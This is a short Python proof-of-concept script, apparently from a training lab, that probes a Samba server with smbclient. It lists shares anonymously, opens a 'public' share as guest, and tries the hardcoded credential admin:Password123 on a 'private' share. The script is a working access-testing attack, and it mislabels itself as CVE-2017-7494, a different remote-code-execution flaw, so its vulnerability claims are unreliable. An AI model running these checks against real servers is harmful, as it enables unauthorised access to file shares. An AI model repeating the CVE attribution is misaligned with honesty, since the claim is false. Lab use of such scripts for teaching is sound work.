#!/usr/bin/env python3
"""Samba Weak File Share Access PoC (CVE-2017-7494)

Tests for anonymous/weak-password SMB share access.
Educational proof-of-concept for KZ-Sploitable lab.
"""

import sys
import subprocess


def run_cmd(cmd, desc):
    print(f"[+] {desc}")
    print(f"    $ {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=15
        )
        output = (result.stdout + result.stderr).strip()
        if output:
            for line in output.split("\n")[:20]:
                print(f"    {line}")
        return result.returncode == 0, output
    except FileNotFoundError:
        print(f"    [!] Command not found: {cmd[0]}")
        print(f"    [*] Install smbclient: apt install smbclient")
        return False, ""
    except subprocess.TimeoutExpired:
        print(f"    [!] Command timed out after 15s")
        return False, ""


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "kz-samba"
    print(f"[*] Target: {target}")
    print(f"[*] CVE: CVE-2017-7494")
    print(f"[*] Type: Weak SMB Share Permissions")
    print()

    print("=== Phase 1: Anonymous Share Enumeration ===")
    success, output = run_cmd(
        ["smbclient", "-L", f"//{target}", "-N"],
        "Listing shares with anonymous access"
    )
    if success:
        print("[+] SUCCESS: Anonymous share listing possible")
    else:
        print("[-] Anonymous listing failed")
    print()

    print("=== Phase 2: Guest Access Test ===")
    success, output = run_cmd(
        ["smbclient", f"//{target}/public", "-N", "-c", "dir"],
        "Accessing 'public' share as guest"
    )
    if success:
        print("[+] SUCCESS: Guest access to public share")
    print()

    print("=== Phase 3: Weak Password Test ===")
    success, output = run_cmd(
        ["smbclient", f"//{target}/private", "-U", "admin%Password123", "-c", "dir"],
        "Accessing 'private' share with admin:Password123"
    )
    if success:
        print("[+] SUCCESS: Weak password grants access to private share")
    else:
        print("[-] Weak password access failed (may be patched)")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
